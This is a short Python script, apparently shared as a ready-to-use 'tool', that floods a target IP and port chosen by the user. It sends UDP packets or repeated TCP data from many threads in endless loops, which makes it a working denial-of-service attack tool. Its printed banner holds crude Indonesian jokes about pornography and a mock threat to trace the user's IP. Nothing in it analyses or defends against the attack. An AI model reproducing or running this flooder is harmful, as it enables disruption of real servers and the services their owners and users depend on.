#!/usr/bin/env python3
#C0de3 By XDempteRX
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" Tools By DempterX ")
print(" Tools Wik-Wik V2 ")
print(" Jang Lupa Nonton Bokep Yah ")
print(" Kalau Gak Mau Nonton Gua Lihat Ip Lo Di Tools Ini ")
print("Misih XDempteRX Minta Wik-Wik Dan Ah-Ah")

ip = str(input(" Ip Server:"))
port = int(input(" Port Server:"))
choice = str(input(" Gass Di WikWik?(y/n):"))
times = int(input(" Packets WikWik:"))
threads = int(input(" Threads WikWik:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[WikWik!!]","[AhAh!!]","[IhIh!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Wik Wik Wik !!!")
		except:
			print("[!] Ah Ah Ah!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[WikWik!!]","[AhAh!!]","[IhIh!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Wik Wik Wik!!!")
		except:
			s.close()
			print("[*] Ah Ah Ah!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
